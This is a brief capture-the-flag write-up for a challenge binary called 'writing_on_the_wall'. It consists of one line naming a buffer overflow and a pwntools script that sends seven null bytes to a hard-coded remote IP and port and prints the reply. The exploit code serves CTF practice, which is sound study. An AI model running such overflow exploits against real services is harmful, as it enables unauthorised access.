Exploit was simply buffer overflow.
```python
from pwn import *

LOCAL_FILE_PATH: str = "./writing_on_the_wall"
REMOTE_SERVER = "94.237.53.104"
REMOTE_PORT = 31293

def pwn_open_door(proc):
    proc.recvuntil(b">> ")
    proc.sendline(b"\x00"*7 )
    res = proc.recvall(timeout=2)
    print(res)

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn_open_door(conn)

def run_bin_local(process_path: str):
    proc = process([process_path])
    pwn_open_door(proc)

def main():
    # run_bin_local(LOCAL_FILE_PATH)
    run_remote()

if __name__ == '__main__':
    main()
```